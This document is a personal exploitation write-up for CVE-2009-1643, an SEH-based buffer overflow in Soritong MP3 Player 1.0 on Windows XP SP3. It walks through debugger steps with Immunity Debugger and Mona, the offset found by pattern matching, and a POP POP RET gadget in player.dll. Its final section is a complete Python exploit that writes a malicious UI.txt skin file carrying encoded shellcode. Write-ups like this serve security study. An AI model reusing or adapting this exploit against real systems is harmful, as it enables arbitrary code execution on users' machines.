# Soritong MP3 Player 1.0 _ Win XP SP3 - Buffer Overflow


-   cve details: [CVE-2009-1643](https://nvd.nist.gov/vuln/detail/CVE-2009-1643)
-   Target: Soritong MP3 Player 1.0 
-   Platform : windows xp- SP3 - Build 2600
-   Exploit : Python 2.7
-   debugger: Immunity Debugger

When program start ,It read config file for generate SKIN. I check installed folder and find folder Skin. This folder have several another folder. But because I use
default skin, I work on. in this folder are a file named UI.txt. Program save Skin confige in this file. I generate a exploit :

```
exploit="A" * 2000

f=open("UI.txt","w")
f.write(exploit)
f.close()
```

Program crashed. I run this program in Immunity. Programm creashed But EIP don't chabge to 41414141 and program send a exception.

![](https://github.com/Creamy-Chicken-Soup/My-Writeup/blob/main/CVE-2009-1643_BOF/images/1.PNG)

Program have BOF,but not vanilla or classic. Because it send exeption, I check SEH chain. For this: View > SEH Chain

![](https://github.com/Creamy-Chicken-Soup/My-Writeup/blob/main/CVE-2009-1643_BOF/images/2.PNG)

I overwrite SEH. For Exploit this program, I need use SEH technique. For this I need:

-   Overwrite Next SEH address
-   Overwrite Current SEH
-   Add our shellcode
-   Create exeption

I overwrite Next SEH address for jump to my shell code, Overwrite current SEH to jump Next SEH address and final create a exeption. \
First I need exactly Overwrite location. I use Mona. I create pattern and replace it to my shell code. run program,after program crashed go to SEH chain and Copy it
to Mona:

![](https://github.com/Creamy-Chicken-Soup/My-Writeup/blob/main/CVE-2009-1643_BOF/images/3.PNG)

I change Exploit to this: (in 588, 584's to recive next seh and 4 for next seh)

```
#BBBB= next seh
#CCCC= current seh
#DDDD= shellcode

exploit="A" * 584 + "BBBB" + "CCCC" + "DDDD"

f=open("UI.txt","w")
f.write(exploit)
f.close()
```

![](https://github.com/Creamy-Chicken-Soup/My-Writeup/blob/main/CVE-2009-1643_BOF/images/4.PNG)

I successfully overwrite both. Now replace really value. In current SEH ,I can't add address because it execute location and I need use this location for jump
Next Seh. For this I need "POP POP ret". every pop ,jump 4 byte and I need 8 byte. after jump ,I'm in NEXT SEH location and when execute "ret", this address add
to EIP. For "POP POP ret", I need find a location.In exploit BOF by SEH, location isn't active SafeSEH. For check it ,I use Mona. "!mona seh". It create a txt file
and If check it :

![](https://github.com/Creamy-Chicken-Soup/My-Writeup/blob/main/CVE-2009-1643_BOF/images/5.PNG)

So I selected location select this Module .I right click and select this:

![](https://github.com/Creamy-Chicken-Soup/My-Writeup/blob/main/CVE-2009-1643_BOF/images/6.PNG)

and type:

```
pop r32
pop r32
ret
```

And select a location from player.dll and I select "100116fd" because it not null bye.after it , My exploit change to it:

```
exploit="A" * 584 + "CCCC" + "\xfd\x16\x01\x10"  + "DDDD"

f=open("UI.txt","w")
f.write(exploit)
f.close()
```

Now we overwrite current SEH. when execption occur , program recive this location and from it jump to NEXT SEH. Now I go to overwrite NEX seh.
When program recive this location, It run instruction. So I need use assembly (opcode). If go to SEH chain and right click and select "fllow address in stack"
and see stack:

![](https://github.com/Creamy-Chicken-Soup/My-Writeup/blob/main/CVE-2009-1643_BOF/images/7.PNG)

BBBB is Next seh and DDDD is my shellcode. For jump from BBBB to DDDD , I dont use address like "jmp address" because I dont know this address. For solve this
problem, I use "short jmp". It jump by number of the step. like "short jmp 06", it jump 6 byte. opcode for this is "eb". I use "eb 6" and two NOP for create
current byte (8). I use it and shellcode to my exploit:

```
xploit="A" * 584 + "\xeb\x06\x90\x90" + "\xfd\x16\x01\x10"  +("\xbd\x89\x6c\x2d\xbd\xdb\xc5\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x31\x31\x6b\x13\x03\x6b\x13\x83\xeb\x75\x8e\xd8\x41\x6d\xcd"
"\x23\xba\x6d\xb2\xaa\x5f\x5c\xf2\xc9\x14\xce\xc2\x9a\x79\xe2"
"\xa9\xcf\x69\x71\xdf\xc7\x9e\x32\x6a\x3e\x90\xc3\xc7\x02\xb3"
"\x47\x1a\x57\x13\x76\xd5\xaa\x52\xbf\x08\x46\x06\x68\x46\xf5"
"\xb7\x1d\x12\xc6\x3c\x6d\xb2\x4e\xa0\x25\xb5\x7f\x77\x3e\xec"
"\x5f\x79\x93\x84\xe9\x61\xf0\xa1\xa0\x1a\xc2\x5e\x33\xcb\x1b"
"\x9e\x98\x32\x94\x6d\xe0\x73\x12\x8e\x97\x8d\x61\x33\xa0\x49"
"\x18\xef\x25\x4a\xba\x64\x9d\xb6\x3b\xa8\x78\x3c\x37\x05\x0e"
"\x1a\x5b\x98\xc3\x10\x67\x11\xe2\xf6\xee\x61\xc1\xd2\xab\x32"
"\x68\x42\x11\x94\x95\x94\xfa\x49\x30\xde\x16\x9d\x49\xbd\x7c"
"\x60\xdf\xbb\x32\x62\xdf\xc3\x62\x0b\xee\x48\xed\x4c\xef\x9a"
"\x4a\xa2\xa5\x87\xfa\x2b\x60\x52\xbf\x31\x93\x88\x83\x4f\x10"
"\x39\x7b\xb4\x08\x48\x7e\xf0\x8e\xa0\xf2\x69\x7b\xc7\xa1\x8a"
"\xae\xa4\x24\x19\x32\x05\xc3\x99\xd1\x59")

f=open("UI.txt","w")
f.write(exploit)
f.close()
```

Now only thing I need, create a exeption. For this I use "A"*500. My exploit finally:

```
exploit="A" * 584 + "\xeb\x06\x90\x90" + "\xfd\x16\x01\x10"  +("\xbd\x89\x6c\x2d\xbd\xdb\xc5\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x31\x31\x6b\x13\x03\x6b\x13\x83\xeb\x75\x8e\xd8\x41\x6d\xcd"
"\x23\xba\x6d\xb2\xaa\x5f\x5c\xf2\xc9\x14\xce\xc2\x9a\x79\xe2"
"\xa9\xcf\x69\x71\xdf\xc7\x9e\x32\x6a\x3e\x90\xc3\xc7\x02\xb3"
"\x47\x1a\x57\x13\x76\xd5\xaa\x52\xbf\x08\x46\x06\x68\x46\xf5"
"\xb7\x1d\x12\xc6\x3c\x6d\xb2\x4e\xa0\x25\xb5\x7f\x77\x3e\xec"
"\x5f\x79\x93\x84\xe9\x61\xf0\xa1\xa0\x1a\xc2\x5e\x33\xcb\x1b"
"\x9e\x98\x32\x94\x6d\xe0\x73\x12\x8e\x97\x8d\x61\x33\xa0\x49"
"\x18\xef\x25\x4a\xba\x64\x9d\xb6\x3b\xa8\x78\x3c\x37\x05\x0e"
"\x1a\x5b\x98\xc3\x10\x67\x11\xe2\xf6\xee\x61\xc1\xd2\xab\x32"
"\x68\x42\x11\x94\x95\x94\xfa\x49\x30\xde\x16\x9d\x49\xbd\x7c"
"\x60\xdf\xbb\x32\x62\xdf\xc3\x62\x0b\xee\x48\xed\x4c\xef\x9a"
"\x4a\xa2\xa5\x87\xfa\x2b\x60\x52\xbf\x31\x93\x88\x83\x4f\x10"
"\x39\x7b\xb4\x08\x48\x7e\xf0\x8e\xa0\xf2\x69\x7b\xc7\xa1\x8a"
"\xae\xa4\x24\x19\x32\x05\xc3\x99\xd1\x59")+"A"*500

f=open("UI.txt","w")
f.write(exploit)
f.close()
```

after run :

![](https://github.com/Creamy-Chicken-Soup/My-Writeup/blob/main/CVE-2009-1643_BOF/images/8.PNG)








